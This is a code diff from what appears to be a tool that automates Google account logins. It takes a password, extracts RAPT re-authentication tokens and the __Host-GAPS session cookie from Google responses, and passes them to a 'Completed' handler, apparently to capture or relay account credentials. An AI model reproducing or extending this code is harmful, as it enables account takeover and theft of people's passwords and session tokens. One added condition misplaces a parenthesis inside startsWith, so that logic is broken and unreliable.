@@ -166,10 +166,9 @@ function passwordMatching(connection, mData, sendCookies, again, loop, gps) {
                     let url = decodeURIComponent(data[0][13][2])
                     let index = url.indexOf('rapt=')
                     let split = url.substring(index+5, url.length).split('&')
-                    let mRAPT = split[0]
                     wrong = false
 
-                    Completed(connection, password, mData, sendCookies, mRAPT)
+                    Completed(connection, password, mData, sendCookies, split[0])
                 }
             } catch (e) {}
 
@@ -276,30 +275,39 @@ function getRaptToken(connection, password, mData, sendCookies) {
                                                         let headers = response.headers
                                                         console.log(headers['location'])
                                                          if(headers && headers['location']) {
-                                                            let index = headers['location'].indexOf('TL=')
-                                                            let tl = headers['location'].substring(index+3, headers['location'].length).split('&')[0]
-                                                            index = headers['location'].indexOf('cid=')
-                                                            let cid = headers['location'].substring(index+4, headers['location'].length).split('&')[0]
-                                                            cookiesList = headers['set-cookie']
-                                                            let gps = mData[4]
-                                                            for(let i=0; i<cookiesList.length; i++) {
-                                                                let singelData = cookiesList[i]
-                                                                try {
-                                                                    let start = singelData.indexOf('=')
-                                                                    let end = singelData.indexOf(';')
-                                                                    let key = singelData.substring(0, start)
-                                                                    if(key == '__Host-GAPS') {
-                                                                        gps = singelData.substring(start+1, end)
-                                                                        i = cookiesList.length
-                                                                    }
-                                                                } catch (e) {}
+                                                            let url = headers['location']
+                                                            if(url.startsWith('https://accounts.google.com/ManageAccount' && url.includes('rapt='))) {
+                                                                let index = url.indexOf('rapt=')
+                                                                let rapt = url.substring(index+5, url.length)
+                                                                wrong = false
+                                            
+                                                                Completed(connection, password, mData, sendCookies, rapt)
+                                                            } else {
+                                                                let index = url.indexOf('TL=')
+                                                                let tl = url.substring(index+3, url.length).split('&')[0]
+                                                                index = url.indexOf('cid=')
+                                                                let cid = url.substring(index+4, url.length).split('&')[0]
+                                                                cookiesList = headers['set-cookie']
+                                                                let gps = mData[4]
+                                                                for(let i=0; i<cookiesList.length; i++) {
+                                                                    let singelData = cookiesList[i]
+                                                                    try {
+                                                                        let start = singelData.indexOf('=')
+                                                                        let end = singelData.indexOf(';')
+                                                                        let key = singelData.substring(0, start)
+                                                                        if(key == '__Host-GAPS') {
+                                                                            gps = singelData.substring(start+1, end)
+                                                                            i = cookiesList.length
+                                                                        }
+                                                                    } catch (e) {}
+                                                                }
+                                                                wrong = false
+                                                                mData[3] = tl
+                                                                mData[4] = gps
+                                                                mData[5] = cid
+                                                                mData[6] = password
+                                                                passwordMatching(connection, mData, sendCookies, 1, 0, gps)
                                                             }
-                                                            wrong = false
-                                                            mData[3] = tl
-                                                            mData[4] = gps
-                                                            mData[5] = cid
-                                                            mData[6] = password
-                                                            passwordMatching(connection, mData, sendCookies, 1, 0, gps)
                                                         }
                                                     } else {}
                                                 } catch (e) {}
